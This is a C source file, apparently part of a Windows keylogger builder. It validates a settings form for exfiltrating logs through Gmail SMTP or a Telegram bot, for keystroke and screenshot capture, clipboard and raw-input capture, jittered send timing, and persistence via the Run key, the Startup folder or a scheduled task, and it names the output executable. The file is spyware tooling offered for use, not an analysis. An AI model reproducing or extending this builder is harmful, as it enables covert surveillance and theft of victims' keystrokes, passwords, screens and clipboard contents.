    SetWindowTextW(bld_ctl(IDC_HOTKEY), hk);

    /* Advanced */
    ui_seg_set_sel(bld_ctl(IDC_PERSIST), cfg->persistence);
    set_utf8(IDC_STORAGEDIR, cfg->storage_dir);
    set_num(IDC_RETENTION, cfg->retention_days);
    set_num(IDC_MAXATTACH, (long)(cfg->max_attach_bytes / (1024u * 1024u)));
    SetWindowTextW(bld_ctl(IDC_OUTDIR), g_out_dir);
    SetWindowTextW(bld_ctl(IDC_OUTNAME), g_out_name);
    ui_set_check(bld_ctl(IDC_QUITHOTKEYEN), cfg->quit_hotkey_enabled);
    hotkey_to_text(cfg->quit_hotkey_mods, cfg->quit_hotkey_vk, hk,
                   BXL_COUNT_OF(hk));
    SetWindowTextW(bld_ctl(IDC_QUITHOTKEY), hk);

    bld_state_summary();
}

/* Ids of the controls that failed the most recent pull. */
static int g_bad_ids[16];
static int g_bad_count;

static void note_bad(int id)
{
    int i;
    for (i = 0; i < g_bad_count; i++) if (g_bad_ids[i] == id) return;
    if (g_bad_count < (int)BXL_COUNT_OF(g_bad_ids)) g_bad_ids[g_bad_count++] = id;
}

/* Read the form into cfg. Free of side effects so that the live summary on
 * the Build page can call it without clearing the operator's error marks. */
static int pull_core(BxlConfig *cfg, const wchar_t **first_err)
{
    BxlConfig c;
    long v;

    g_bad_count = 0;
    *first_err  = NULL;
    bxl_config_defaults(&c);

#define FAIL(id, msg) do { \
        if (!*first_err) *first_err = (msg); \
        note_bad(id); \
    } while (0)

    /* ---- delivery ------------------------------------------------------- */
    get_utf8(IDC_RECIPIENT, c.recipient, sizeof(c.recipient));
    get_utf8(IDC_SENDER, c.sender, sizeof(c.sender));
    get_utf8(IDC_APPPASS, c.app_password, sizeof(c.app_password));
    get_utf8(IDC_SMTPHOST, c.smtp_host, sizeof(c.smtp_host));
    get_utf8(IDC_SUBJECT, c.subject_prefix, sizeof(c.subject_prefix));

    c.auth_enabled = (bxl_u8)(ui_get_check(bld_ctl(IDC_AUTHEN)) ? 1 : 0);
    c.tls_mode     = (bxl_u8)ui_seg_get_sel(bld_ctl(IDC_TLSMODE));
    c.html_body    = (bxl_u8)(ui_get_check(bld_ctl(IDC_HTMLBODY)) ? 1 : 0);
    c.separate_emails = (bxl_u8)(ui_get_check(bld_ctl(IDC_SEPARATE)) ? 1 : 0);

    /* Channel, and the Telegram fields it governs. */
    c.channel = (bxl_u8)ui_seg_get_sel(bld_ctl(IDC_CHANNEL));
    get_utf8(IDC_TGTOKEN, c.tg_bot_token, sizeof(c.tg_bot_token));
    get_utf8(IDC_TGCHAT, c.tg_chat_id, sizeof(c.tg_chat_id));
    c.tg_parse_html       = (bxl_u8)(ui_get_check(bld_ctl(IDC_TGHTML)) ? 1 : 0);
    c.tg_send_screenshots = (bxl_u8)(ui_get_check(bld_ctl(IDC_TGSHOTS)) ? 1 : 0);
    c.tg_full_log_file    = (bxl_u8)(ui_get_check(bld_ctl(IDC_TGFULL)) ? 1 : 0);

    /* Only the selected channels are validated: requiring SMTP credentials on
     * a Telegram-only build would block a perfectly usable configuration. */
    if (c.channel == BXL_CHANNEL_EMAIL || c.channel == BXL_CHANNEL_BOTH) {
        if (!c.recipient[0] || !strchr(c.recipient, '@'))
            FAIL(IDC_RECIPIENT, L"Enter a valid recipient Gmail address.");
        if (!c.sender[0] || !strchr(c.sender, '@'))
            FAIL(IDC_SENDER, L"Enter a valid sender Gmail address.");
        if (c.auth_enabled && !c.app_password[0])
            FAIL(IDC_APPPASS, L"An App Password is required when authentication is enabled.");
        if (!c.smtp_host[0])
            FAIL(IDC_SMTPHOST, L"Enter the SMTP host (smtp.gmail.com for Gmail).");

        if (!get_num(IDC_SMTPPORT, 1, 65535, 465, &v))
            FAIL(IDC_SMTPPORT, L"Port must be between 1 and 65535.");
        else
            c.smtp_port = (bxl_u16)v;

        /* Port and TLS mode are not independent choices. A listener on 465
         * begins TLS before it says anything, so a STARTTLS client pointed at
         * it waits for a plaintext greeting that never arrives and dies at the
         * greeting stage with an empty reply. Catch the combination here,
         * where the cause is obvious, instead of letting it surface as a
         * socket timeout. */
        if (c.tls_mode == BXL_TLS_IMPLICIT && c.smtp_port == 587)
            FAIL(IDC_SMTPPORT, L"Port 587 is the STARTTLS port. Use 465 with implicit TLS, or switch TLS mode to STARTTLS.");
        else if (c.tls_mode == BXL_TLS_STARTTLS && c.smtp_port == 465)
            FAIL(IDC_SMTPPORT, L"Port 465 is the implicit-TLS port. Use 587 with STARTTLS, or switch TLS mode to Implicit.");
    }

    if (c.channel == BXL_CHANNEL_TELEGRAM || c.channel == BXL_CHANNEL_BOTH) {
        if (!bxl_telegram_token_ok(c.tg_bot_token))
            FAIL(IDC_TGTOKEN, L"Paste the bot token from @BotFather - it looks like 123456789:AAH...");
        if (!bxl_telegram_chat_ok(c.tg_chat_id))
            FAIL(IDC_TGCHAT, L"Enter a numeric chat id (e.g. -1001234567890) or @channelname.");
    }

    /* ---- schedule ------------------------------------------------------- */
    if (!get_num(IDC_LOGINT, 0, (long)BXL_MAX_INTERVAL_MIN, 10, &v))
        FAIL(IDC_LOGINT, L"Log interval must be 0 to 10080 minutes.");
    else
        c.log_interval_min = (bxl_u32)v;

    if (!get_num(IDC_LOGKEYS, 0, 1000000, 0, &v))
        FAIL(IDC_LOGKEYS, L"Keystroke threshold must be 0 to 1000000.");
    else
        c.log_keystroke_threshold = (bxl_u32)v;

    if (c.log_interval_min == 0 && c.log_keystroke_threshold == 0) {
        FAIL(IDC_LOGINT, L"Set a log interval or a keystroke threshold, otherwise no logs are ever sent.");
        FAIL(IDC_LOGKEYS, L"Set a log interval or a keystroke threshold, otherwise no logs are ever sent.");
    }

    c.shot_enabled = (bxl_u8)(ui_get_check(bld_ctl(IDC_SHOTEN)) ? 1 : 0);
    if (!get_num(IDC_SHOTINT, 0, (long)BXL_MAX_INTERVAL_MIN, 15, &v))
        FAIL(IDC_SHOTINT, L"Screenshot interval must be 0 to 10080 minutes.");
    else
        c.shot_interval_min = (bxl_u32)v;

    if (c.shot_enabled && c.shot_interval_min == 0)
        FAIL(IDC_SHOTINT, L"Screenshots are enabled, so the interval must be at least 1 minute.");

    c.daily_enabled = (bxl_u8)(ui_get_check(bld_ctl(IDC_DAILYEN)) ? 1 : 0);
    {
        wchar_t t[32];
        int hh = 0, mm = 0;
        t[0] = 0;
        GetWindowTextW(bld_ctl(IDC_DAILYTIME), t, (int)BXL_COUNT_OF(t));
        if (swscanf_s(t, L"%d:%d", &hh, &mm) != 2 || hh < 0 || hh > 23 ||
            mm < 0 || mm > 59) {
            FAIL(IDC_DAILYTIME, L"Daily report time must look like 08:30 (24-hour).");
        } else {
            c.daily_hour   = (bxl_u8)hh;
            c.daily_minute = (bxl_u8)mm;
        }
    }

    c.jitter_enabled = (bxl_u8)(ui_get_check(bld_ctl(IDC_JITTEREN)) ? 1 : 0);
    if (!get_num(IDC_JITTERPCT, 0, 50, 10, &v))
        FAIL(IDC_JITTERPCT, L"Jitter must be 0 to 50 percent.");
    else
        c.jitter_percent = (bxl_u8)v;

    /* ---- capture -------------------------------------------------------- */
    c.shot_monitors = (bxl_u8)ui_seg_get_sel(bld_ctl(IDC_MONITORS));
    c.shot_format   = (bxl_u8)ui_seg_get_sel(bld_ctl(IDC_SHOTFMT));

    if (!get_num(IDC_JPEGQ, 1, 100, 80, &v))
        FAIL(IDC_JPEGQ, L"JPEG quality must be between 1 and 100.");
    else
        c.shot_jpeg_quality = (bxl_u8)v;

    if (!get_num(IDC_MAXDIM, 0, 16384, 1920, &v))
        FAIL(IDC_MAXDIM, L"Max dimension must be 0 to 16384 pixels.");
    else
        c.shot_max_dim = (bxl_u32)v;

    if (!get_num(IDC_MAXCOUNT, 1, 1000, 20, &v))
        FAIL(IDC_MAXCOUNT, L"Max shots per batch must be 1 to 1000.");
    else
        c.shot_max_count = (bxl_u32)v;

    c.clipboard_capture = (bxl_u8)(ui_get_check(bld_ctl(IDC_CLIP)) ? 1 : 0);
    c.capture_raw_input = (bxl_u8)(ui_get_check(bld_ctl(IDC_RAWIN)) ? 1 : 0);
    c.single_instance   = (bxl_u8)(ui_get_check(bld_ctl(IDC_SINGLE)) ? 1 : 0);
    c.debug_log         = (bxl_u8)(ui_get_check(bld_ctl(IDC_DEBUGLOG)) ? 1 : 0);

    c.hotkey_enabled = (bxl_u8)(ui_get_check(bld_ctl(IDC_HOTKEYEN)) ? 1 : 0);
    {
        wchar_t t[64];
        t[0] = 0;
        GetWindowTextW(bld_ctl(IDC_HOTKEY), t, (int)BXL_COUNT_OF(t));
        if (c.hotkey_enabled && !hotkey_from_text(t, &c.hotkey_mods, &c.hotkey_vk))
            FAIL(IDC_HOTKEY, L"Hotkey must look like Ctrl+Alt+P or Ctrl+Shift+F9.");
    }

    c.quit_hotkey_enabled =
        (bxl_u8)(ui_get_check(bld_ctl(IDC_QUITHOTKEYEN)) ? 1 : 0);
    {
        wchar_t t[64];
        t[0] = 0;
        GetWindowTextW(bld_ctl(IDC_QUITHOTKEY), t, (int)BXL_COUNT_OF(t));
        if (c.quit_hotkey_enabled &&
            !hotkey_from_text(t, &c.quit_hotkey_mods, &c.quit_hotkey_vk))
            FAIL(IDC_QUITHOTKEY, L"Quit hotkey must look like Ctrl+Alt+Q.");
    }

    /* Two hotkeys that resolve to the same combination would make the second
     * RegisterHotKey fail at runtime, silently leaving one action unreachable. */
    if (c.hotkey_enabled && c.quit_hotkey_enabled &&
        c.hotkey_mods == c.quit_hotkey_mods && c.hotkey_vk == c.quit_hotkey_vk) {
        FAIL(IDC_QUITHOTKEY, L"The quit hotkey must differ from the pause hotkey.");
    }

    /* ---- advanced ------------------------------------------------------- */
    c.persistence = (bxl_u8)ui_seg_get_sel(bld_ctl(IDC_PERSIST));
    get_utf8(IDC_STORAGEDIR, c.storage_dir, sizeof(c.storage_dir));

    if (!get_num(IDC_RETENTION, 0, 3650, 7, &v))
        FAIL(IDC_RETENTION, L"Retention must be 0 to 3650 days.");
    else
        c.retention_days = (bxl_u32)v;

    /* Gmail hard-limits a message to 25 MB including MIME overhead, so the
     * attachment budget is expressed in whole megabytes and capped at 25. */
    if (!get_num(IDC_MAXATTACH, 1, 25, 20, &v))
        FAIL(IDC_MAXATTACH, L"Max attachment size must be 1 to 25 MB.");
    else
        c.max_attach_bytes = (bxl_u32)v * 1024u * 1024u;

    /* ---- output settings (builder-local) -------------------------------- */
    {
        wchar_t dir[MAX_PATH * 2], name[MAX_PATH];
        dir[0] = 0; name[0] = 0;
        GetWindowTextW(bld_ctl(IDC_OUTDIR), dir, (int)BXL_COUNT_OF(dir));
        GetWindowTextW(bld_ctl(IDC_OUTNAME), name, (int)BXL_COUNT_OF(name));

        if (!dir[0])  FAIL(IDC_OUTDIR, L"Choose an output folder.");
        if (!name[0]) FAIL(IDC_OUTNAME, L"Choose an output filename.");
        if (name[0] && wcschr(name, L'\\'))
            FAIL(IDC_OUTNAME, L"The filename must not contain a path separator.");
        if (name[0] && !wcschr(name, L'.'))
            StringCchCatW(name, BXL_COUNT_OF(name), L".exe");

        StringCchCopyW(g_out_dir, BXL_COUNT_OF(g_out_dir), dir);
        StringCchCopyW(g_out_name, BXL_COUNT_OF(g_out_name), name);
    }

#undef FAIL

    if (*first_err) return BXL_FALSE;

    /* Normalise, then hand back a sealed config. */
    bxl_config_sanitize(&c);
    bxl_config_seal(&c);
    *cfg = c;
    return BXL_TRUE;
}

int bld_state_pull(BxlConfig *cfg, wchar_t *err, size_t err_cch)
{
    const wchar_t *msg = NULL;
    int i;

    bld_clear_invalid();
    if (pull_core(cfg, &msg)) return BXL_TRUE;

    for (i = 0; i < g_bad_count; i++) bld_mark_invalid(g_bad_ids[i], 1);
    if (err) StringCchCopyW(err, err_cch, msg);
    bld_status(L"Fix the highlighted fields: %s", 2, msg);
    return BXL_FALSE;
}

static const wchar_t *channel_text(int ch)
{
    switch (ch) {
    case BXL_CHANNEL_TELEGRAM: return L"Telegram bot";
    case BXL_CHANNEL_BOTH:     return L"Gmail + Telegram";
    default:                   return L"Gmail (SMTP)";
    }
}

void bld_state_summary(void)
{
    BxlConfig c;
    wchar_t  buf[4096];
    wchar_t  hk[64];
    wchar_t  qhk[64];
    wchar_t  digest[160];
    wchar_t  tgline[512];
    HWND     h = bld_ctl(IDC_SUMMARY);

    if (!h) return;
    {
        const wchar_t *msg = NULL;
        if (!pull_core(&c, &msg)) {
            SetWindowTextW(h, L"Configuration is not valid yet - fix the "
                              L"highlighted fields.");
            return;
        }
    }

    hotkey_to_text(c.hotkey_mods, c.hotkey_vk, hk, BXL_COUNT_OF(hk));
    hotkey_to_text(c.quit_hotkey_mods, c.quit_hotkey_vk, qhk, BXL_COUNT_OF(qhk));

    /* A zero in either trigger means "this trigger is off", so printing the
     * raw numbers would read as "every 10 min or 0 keystrokes". Spell out
     * which triggers are actually armed instead. */
    if (c.log_interval_min && c.log_keystroke_threshold) {
        StringCchPrintfW(digest, BXL_COUNT_OF(digest),
                         L"every %u min or %u keystrokes, whichever is first",
                         (unsigned)c.log_interval_min,
                         (unsigned)c.log_keystroke_threshold);
    } else if (c.log_interval_min) {
        StringCchPrintfW(digest, BXL_COUNT_OF(digest),
                         L"every %u min", (unsigned)c.log_interval_min);
    } else if (c.log_keystroke_threshold) {
        StringCchPrintfW(digest, BXL_COUNT_OF(digest),
                         L"every %u keystrokes",
                         (unsigned)c.log_keystroke_threshold);
    } else {
        StringCchCopyW(digest, BXL_COUNT_OF(digest), L"never");
    }

    /* Telegram detail, shown only when that channel is selected. The token is
     * redacted: the summary is an on-screen panel, and a full bot token there
     * would be readable by anyone looking over the operator's shoulder. */
    tgline[0] = 0;
    if (c.channel == BXL_CHANNEL_TELEGRAM || c.channel == BXL_CHANNEL_BOTH) {
        char    redacted[64];
        wchar_t wtok[128];
        wchar_t wchat[128];

        bxl_telegram_redact(c.tg_bot_token, redacted, sizeof(redacted));
        if (!bxl_utf8_to_wide(redacted, wtok, BXL_COUNT_OF(wtok))) wtok[0] = 0;
        if (!bxl_utf8_to_wide(c.tg_chat_id, wchat, BXL_COUNT_OF(wchat)))
            wchat[0] = 0;

        StringCchPrintfW(tgline, BXL_COUNT_OF(tgline),
            L"\r\nTelegram       : bot %ls -> %ls\r\n"
            L"Telegram media : %ls, %ls, %ls",
            wtok[0] ? wtok : L"(no token)",
            wchat[0] ? wchat : L"(no chat id)",
            c.tg_send_screenshots ? L"screenshots attached" : L"text only",
            c.tg_full_log_file ? L"full log as .txt" : L"no log file",
            c.tg_parse_html ? L"HTML formatting" : L"plain text");
    }

    StringCchPrintfW(buf, BXL_COUNT_OF(buf),
        L"Channel        : %ls\r\n"
        L"Recipient      : %hs\r\n"
        L"Sender         : %hs\r\n"
        L"SMTP           : %hs:%u  (%hs)\r\n"
        L"Log digest     : %ls\r\n"
        L"Screenshots    : %hs, every %u min, %hs, max %u px\r\n"
        L"Daily report   : %hs\r\n"
        L"Jitter         : %hs\r\n"
        L"Persistence    : %hs\r\n"
        L"Pause hotkey   : %ls\r\n"
        L"Quit hotkey    : %ls\r\n"
        L"Output         : %ls\\%ls%ls",
        channel_text(c.channel),
        c.recipient, c.sender, c.smtp_host, (unsigned)c.smtp_port,
        c.tls_mode == BXL_TLS_IMPLICIT ? "implicit TLS 465" :
        c.tls_mode == BXL_TLS_STARTTLS ? "STARTTLS 587" : "no TLS",
        digest,
        c.shot_enabled ? "enabled" : "disabled", c.shot_interval_min,
        c.shot_format == BXL_FMT_PNG ? "PNG" : "JPEG", c.shot_max_dim,
        c.daily_enabled ? L"on" : L"off",
        c.jitter_enabled ? L"on" : L"off",
        c.persistence == BXL_PERSIST_OFF ? L"off (default)" :
        c.persistence == BXL_PERSIST_RUNKEY ? L"HKCU Run key" :
        c.persistence == BXL_PERSIST_STARTUP ? L"Startup folder" : L"Scheduled task",
        c.hotkey_enabled ? hk : L"disabled",
        c.quit_hotkey_enabled ? qhk : L"disabled",
        g_out_dir, g_out_name, tgline);

    SetWindowTextW(h, buf);
}

/*----------------------------------------------------------------------------
 * Output path helpers used by actions.c
 *--------------------------------------------------------------------------*/
const wchar_t *bld_out_dir(void)  { return g_out_dir; }
const wchar_t *bld_out_name(void) { return g_out_name; }
